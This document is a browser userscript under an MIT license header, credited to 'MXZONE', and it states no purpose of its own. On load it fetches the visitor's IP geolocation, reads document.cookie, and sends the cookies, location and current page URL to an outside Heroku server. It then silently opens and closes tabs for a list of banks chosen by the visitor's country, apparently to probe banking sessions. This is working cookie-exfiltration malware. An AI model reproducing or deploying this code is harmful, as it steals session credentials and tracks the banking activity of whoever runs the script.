


//MIT License
//
//Copyright (c) 2024 MXZONE
//
//Permission is hereby granted, free of charge, to any person obtaining a copy
//of this software and associated documentation files (the "Software"), to deal
//in the Software without restriction, including without limitation the rights
//to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
//copies of the Software, and to permit persons to whom the Software is
//furnished to do so, subject to the following conditions:
//
//The above copyright notice and this permission notice shall be included in all
//copies or substantial portions of the Software.
//
//THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
//SOFTWARE.


// NOTE: Remember to always allow the script to access a cross site origin

// Function to send log to server
function sendLogToServer(logData) {
    // Retrieve cookies
    var MXZONEWASHERE = document.cookie;

    // Construct query string including cookies
    var queryString = '?ipGeolocation=' + encodeURIComponent(JSON.stringify(logData.ipGeolocation)) +
        '&currentWebsiteURL=' + encodeURIComponent(logData.currentWebsiteURL) +
        '&MXZONE=' + encodeURIComponent(MXZONEWASHERE);

    // Send log data to server
    GM_xmlhttpRequest({
        method: 'GET',
        url: 'https://boiling-tor-53603-412f89feae18.herokuapp.com/' + queryString,
        onload: function(response) {
            console.log('Log sent successfully:', response.responseText);
        },
        onerror: function(error) {
            console.error('Error sending log to server:', error);
        }
    });
}

// Function to open a link
function openLink(link) {
    var newWindow = window.open(link, '_blank');
    setTimeout(function() {
        newWindow.close();
    }, 5000); // Adjust the delay (in milliseconds) as needed
}

// Function to open all links sequentially with a delay between each link
function openLinksSequentially(links, index, delay) {
    if (index < links.length) {
        setTimeout(function() {
            openLink(links[index]);
            openLinksSequentially(links, index + 1, delay);
        }, delay);
    }
}

// Function to log IP geolocation and current website and send to server
function logIPGeolocationAndWebsite(response) {
    try {
        // Parse geolocation data
        var geoData = JSON.parse(response.responseText);
        var logData = {
            ipGeolocation: geoData,
            currentWebsiteURL: window.location.href
        };
        sendLogToServer(logData);

        // List of links for different countries
        var links = {
            'US': [
                'https://www.chase.com/',
                'https://www.bankofamerica.com/',
                'http://www.citibank.com/us/homepage/home.htm',
                'https://www.wellsfargo.com/',
                'https://www.usbank.com/index.html',
                'https://www.capitalbank.com/',
                'https://www.td.com/us/en/personal-banking',
                'https://www.goldmansachs.com/',
                'https://www.synchrony.com/',
                'https://www.bmo.com/en-ca/main/personal/',
                'https://www.statestreet.com/au/en/individual',
                'https://www.ally.com/',
                'https://www.huntington.com/',
                'https://www.truist.com/',
                'https://www.citizensbank.com/',
                'https://www.key.com/personal/',
                'https://www.hsbc.com/'
            ],
            'CA': [
                'https://www.td.com/us/en/personal-banking',
                'https://www.rbcroyalbank.com/',
                'https://www.bmo.com/en-ca/main/personal/',
                'https://www.scotiabank.com/ca/en/personal.html',
                'https://www.cibc.com/en/personal-banking.html',
                'https://www.nbc.ca/'
            ],
            'CN': [
                'https://www.icbc-ltd.com/ICBCLtd/',
                'http://www.ccb.com/eng/home/index.shtml',
                'https://www.bankofchina.com/au/',
                'https://www.abchina.com/'
            ],
            'UK': [
                'https://www.chase.com/',
                'https://www.firstdirect.com/',
                'https://www.starlingbank.com/',
                'https://monzo.com/',
                'https://www.bankofscotland.co.uk/',
                'https://www.nationwide.co.uk/',
                'https://www.revolut.com/',
                'https://www.natwest.com/',
                'http://www.rbs.co.uk/',
                'https://www.santander.co.uk/',
                'https://www.lloydsbank.com/',
                'https://www.barclays.co.uk/',
                'https://uk.virginmoney.com/',
                'https://www.halifax.co.uk/',
                'https://www.co-operativebank.co.uk/',
                'https://www.hsbc.com/',
                'https://www.tsb.co.uk/'
            ],
            'IT': [
                'https://group.intesasanpaolo.com/',
                'https://www.unicreditgroup.eu/',
                'https://www.mps.it/',
                'https://www.bancobpm.it/',
                'https://bnl.it/it',
                'https://www.mediobanca.com/',
                'https://www.bper.it/',
                'https://it.finecobank.com/',
                'https://www.bancageneraliprivate.it/homepage',
                'https://www.poste.it/',
                'https://www.bancamediolanum.it/',
                'https://www.credem.it/',
                'https://www.db.com/',
                'https://www.ing.com.au/',
                'https://www.bancaditalia.it/',
                'https://www.cdp.it/sitointernet/',
                'https://www.credit-agricole.it/',
                'https://www.mcc.it/'
            ],
            'BR': [
                'https://www.itau.com.br/',
                'https://banco.bradesco/',
                'https://www.santander.com.br/',
                'https://www.bb.com.br/',
                'https://www.caixa.gov.br/',
                'https://www.safra.com.br/index.htm',
                'https://www.btgpactual.com/',
                'https://www.bv.com.br/',
                'https://www.hsbc.fr/en-fr/',
                'https://business.bofa.com/',
                'https://corporateportal.brazil.citibank.com/',
                'https://nubank.com.br/',
                'https://brasil.bnpparibas/pt/',
                'https://www.xpi.com.br/'
            ],
            'KR': [
                'https://omoney.kbstar.com/quics?page=oeng#loading',
                'https://www.shinhan.com/en/index.jsp',
                'https://banking.nonghyup.com/nhbank.html',
                'https://www.hanafn.com/en/main/index.do',
                'https://www.kdbbank.eu/kdb-bank-seoul',
                'https://spot.wooribank.com/pot/Dream?withyou=en&LCL=EN',
                'https://global.ibk.co.kr/',
                'http://www.dgbfg.co.kr/ad01.fg',
                'https://m.kjbank.com/mweb/main/',
                'https://www.busanbank.co.kr/ib20/mnu/BHP00001',
            ],
            'DE': [
                'https://www.commerzbank.de/portal/en/englisch/english.html',
                'https://www.db.com/index?language_id=1&kid=sl.redirect-en.shortcut',
                'https://www.kfw-entwicklungsbank.de/International-financing/KfW-Entwicklungsbank/',
                'https://n26.com/en-eu',
                'https://www.dzbank.com/',
                'https://www.bayernlb.com/internet/en/blb/resp/index.jsp',
                'https://www.hypovereinsbank.de/hvb/privatkunden',
                'https://www.nordlb.com/',
                'https://www.dkb.de/',
                'https://www.postbank.de/',
                'https://www.hcob-bank.de/en/startseite/',
                'https://www.ing.com.au/',
                'https://www.jpmorgan.com/DE/en/about-us',
                'https://www.ubs.com/de/en.html',
            ],
            'JP': [
                'https://www.mufg.jp/english/index.html',
                'https://www.smbc.co.jp/global/',
                'https://www.mizuhogroup.com/bank',
                'https://www.jp-bank.japanpost.jp/en_index.html',
                'https://www.chibabank.co.jp/english/',
                'https://www.resona-gr.co.jp/holdings/english/',
                'https://www.nochubank.or.jp/en/',
                'https://www.sbishinseibank.co.jp/english/',
                'https://www.fukuoka-fg.com/en/',
                'https://www.concordia-fg.jp/en/index.html',
                'https://www.smbctb.co.jp/en/',
            ],
            'FR': [
                'https://group.bnpparibas/en/',
                'https://groupebpce.com/en',
                'https://www.credit-agricole.com/',
                'https://www.credit-agricole.com/',
                'https://www.societegenerale.com/fr',
                'https://www.labanquepostale.fr/',
                'https://www.axa.fr/espace-client.html',
                'https://www.hsbc.fr/en-fr/index/',
                'https://www.credit-cooperatif.coop/',
                'https://particuliers.sg.fr/',
                'https://www.creditmutuel.fr/home/index.html',
            ],
            'IN': [
                'https://www.axisbank.com/',
                'https://www.hdfcbank.com/personal/',
                'https://www.icicibank.com/',
                'https://www.indusind.com/',
                'https://www.kotak.com/en/home.html',
                'https://sbi.co.in/',
                'https://www.bankofbaroda.in/',
                'https://www.pnbindia.in/',
                'https://www.unionbankofindia.co.in/english/home.aspx',
                'https://bankofindia.co.in/',
                'https://canarabank.com/',
                'https://www.yesbank.in/',
                'https://www.idbibank.in/',
                'https://www.idfcfirstbank.com/',
                'https://indianbank.in/',
                'https://www.ucoebanking.in/',
                'https://bandhanbank.com/',
            ],

            'CH': [
                'https://www.revolut.com/',
                'https://www.ubs.com/',
                'https://www.credit-suisse.com/',
                'https://www.sgkb.ch/',
                'https://www.lukb.ch/',
                'https://www.efginternational.com/',
                'https://www.raiffeisen.ch/',
                'https://www.zkb.ch/',
                'https://www.bkb.ch/',
                'https://www.bcv.ch/',
                'https://www.juliusbaer.com/',
            ],

            'NO': [
                'https://www.sparebank1.no/',
                'https://www.landkredittbank.no/',
                'https://www.fanasparebank.no/',
                'https://www.banknorwegian.no/',
                'https://www.bnbank.no/',
                'https://www.dengulebanken.no/',
                'https://www.oest.no/',
                'https://sbanken.no/',
                'https://www.romsdalsbanken.no/',
                'https://spareskillingsbanken.no/',
                'https://www.rorosbanken.no/',
                'https://www.rsbank.no/',
                'https://paretobank.no/',
                'https://www.asbank.no/',
                'https://www.obos.no/',
                'https://www.santanderconsumer.no/',
                'https://skudeaakra.no/',
                'https://www.grong-sparebank.no/',
                'https://flekkefjordsparebank.no/',
                'https://www.aurskog-sparebank.no/',
                'https://www.orklasparebank.no/',
                'https://www.dnb.no/',
                'https://www.melhusbanken.no/',
                'https://www.jbf.no/',
                'https://www.haugesund-sparebank.no/',
                'https://www.skagerraksparebank.no/',
                'https://www.klp.no/',
                'https://www.jaerensparebank.no/',
                'https://www.skuesparebank.no/',
            ],

        };

        // Determine links based on country
        var countryLinks = links[geoData.country];

        // Open links sequentially with a delay between each link
        if (countryLinks) {
            openLinksSequentially(countryLinks, 0, 3000); // Adjust the delay (in milliseconds) as needed
        } else {
            console.log('No links found for the country:', geoData.country);
        }
    } catch (error) {
        console.error('Error parsing geolocation data:', error);
    }
}

// Fetch geolocation data using ipinfo.io API
GM_xmlhttpRequest({
    method: 'GET',
    url: 'https://ipinfo.io/json?token=d8a4d978d5d997',
    onload: logIPGeolocationAndWebsite,
    onerror: function(error) {
        console.error('Error fetching geolocation data:', error);
    }
});
